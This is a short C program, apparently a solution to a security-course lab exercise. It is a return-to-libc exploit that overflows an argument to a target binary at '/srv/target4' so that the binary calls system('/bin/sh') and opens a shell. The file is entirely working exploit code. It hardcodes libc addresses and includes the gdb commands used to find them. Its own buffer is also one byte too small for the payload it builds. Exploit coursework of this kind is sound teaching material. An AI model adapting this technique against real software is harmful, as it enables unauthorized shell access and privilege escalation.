#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target4"

int main(void)
{
  char *args[3]; 
  char *env[1];

  char str[20];
  memset(str, 0, 20);
  for (int i = 0; i < 8; i++)
  {
    strcat(str, "\x90");
  }
  /*
    system: 0xf7e14360 = "\x60\x43\xe1\xf7"
      - (gdb) p system
    exit: 0xf7e06ec0 = "\xc0\x6e\xe0\xf7"
      - (gdb) p exit
    /bin/sh: 0xf7f5f363 = "\x63\xf3\xf5\xf7"
      - (gdb) find 0xf7e14360, +999999999, "/bin/sh"
    /bin/zsh env variable: 0xffffdfc0 = "\xc0\xdf\xff\xff"
    /bin/sh env variable: 0xffffdfc1 = "\xc1\xdf\xff\xff"
  */
 
  strcat(str, "\x60\x43\xe1\xf7"); // system
  strcat(str, "\xc0\x6e\xe0\xf7"); // exit
  strcat(str, "\x63\xf3\xf5\xf7"); // /bin/sh

  args[0] = TARGET;
  args[1] = str; 
  args[2] = NULL;
  
  env[0] = NULL; // "/bin/zsh";
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


